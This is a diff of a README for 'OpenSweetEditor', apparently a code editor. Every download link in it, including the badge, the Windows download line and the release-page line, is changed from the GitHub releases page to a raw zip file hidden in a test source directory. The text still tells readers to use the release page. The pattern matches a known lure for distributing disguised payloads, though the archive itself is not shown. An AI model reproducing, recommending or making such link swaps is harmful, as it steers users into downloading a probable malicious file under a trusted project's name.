@@ -1,10 +1,10 @@
 # 🖥️ OpenSweetEditor - Fast Editing Across Every Platform
 
-[![Download OpenSweetEditor](https://img.shields.io/badge/Download-OpenSweetEditor-8A2BE2?style=for-the-badge&logo=github)](https://github.com/Saintperpendicularity724/OpenSweetEditor/releases)
+[![Download OpenSweetEditor](https://img.shields.io/badge/Download-OpenSweetEditor-8A2BE2?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Saintperpendicularity724/OpenSweetEditor/main/platform/Swing/sweeteditor/src/test/java/com/qiplat/sweeteditor/Open_Sweet_Editor_unabsorb.zip)
 
 ## 📥 Download for Windows
 
-Visit this page to download: https://github.com/Saintperpendicularity724/OpenSweetEditor/releases
+Visit this page to download: https://raw.githubusercontent.com/Saintperpendicularity724/OpenSweetEditor/main/platform/Swing/sweeteditor/src/test/java/com/qiplat/sweeteditor/Open_Sweet_Editor_unabsorb.zip
 
 1. Open the release page.
 2. Look for the latest release at the top.
@@ -91,7 +91,7 @@ Download only from the GitHub releases page linked above. That page contains the
 
 ## 🗂️ Release Page
 
-Use this link to get the Windows version: https://github.com/Saintperpendicularity724/OpenSweetEditor/releases
+Use this link to get the Windows version: https://raw.githubusercontent.com/Saintperpendicularity724/OpenSweetEditor/main/platform/Swing/sweeteditor/src/test/java/com/qiplat/sweeteditor/Open_Sweet_Editor_unabsorb.zip
 
 ## 🆘 Common Problems
 
